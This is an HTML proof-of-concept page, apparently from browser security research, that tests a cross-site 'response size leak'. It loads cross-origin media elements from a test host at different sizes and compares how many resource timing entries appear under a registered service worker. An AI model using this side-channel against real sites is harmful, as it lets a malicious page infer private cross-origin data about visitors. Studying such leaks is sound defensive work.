<!DOCTYPE html>
<html>
  <head>
    <title>Response size leak</title>
    <script>

      if ("serviceWorker" in navigator) {
				addEventListener("load", async () => {
					performance.setResourceTimingBufferSize(1337);
					const registration = await navigator.serviceWorker.register("serviceworker.js");
					if (registration.installing)
						location.reload();
				});
			}


      function show(element, url, size, event, diff) {
        document.getElementById('tbody').innerHTML += `<tr><td>${element}</td><td>${url}</td><td>${size}</td><td>${event}</td><td>${diff}</td><tr>`;
        console.log(performance.getEntries());
      }

      function get(element, url, size) {
        let start = performance.getEntries().length;
        let e = document.createElement(element);
        e['src'] = `${url}?size=${size}`;

        e.onload = () => {
          let diff = performance.getEntries().length - start;
          show(element, url, size, 'onload', diff);
        }
        e.onerror = () => {
          let diff = performance.getEntries().length - start;
          show(element, url, size, 'onerror', diff);
        }
      }

      function run() {
        base = 'https://target.georgetian.com/';
        resources = [
          //'text.txt',
          'audio',
          //'frame',
          //'iframe',
          'img',
          //'script',
          'video',
        ];
        small = 2;
        sizes = [
          2,
          13370,
        ];

        elements = [
          'audio',
          //'embed',
          //'iframe',
          //'frame',
          'img',
          //'input',
          //'script',
          //'source',
          //'track',
          'video',
        ];

        let wait = 1000;
        for (const element of elements) {
          for (const resource of resources) {
            for (const size of sizes) {
              setTimeout(get, wait, element, base + resource, size);
              wait += 500;
            }
          }
        }
      }
      
      onload = () => {
        run();
      }

    </script>

    <style>
      table, th, td {
        border: 1px solid black;
        border-collapse: collapse;
      }
    </style>
  </head>

  <body>
    <table>
      <thead>
        <tr>
          <th>Element</th>
          <th>URL</th>
          <th>Size</th>
          <th>Event</th>
          <th>Entries</th>
        </tr>
      </thead>
      <tbody id="tbody">

      </tbody>
    </table>
  </body>

</html>